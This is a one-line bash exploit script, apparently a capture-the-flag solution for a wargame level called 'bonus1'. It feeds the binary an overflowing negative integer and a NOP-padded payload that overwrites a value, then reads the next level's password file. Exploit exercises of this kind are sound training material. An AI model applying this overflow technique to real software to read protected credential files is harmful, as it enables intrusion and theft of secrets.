#!/bin/bash

echo "cat /home/user/bonus2/.pass" | ~/bonus1 -2147483637 $(python -c 'import struct; print "\x90" * 40 + struct.pack("I", 0x574f4c46)');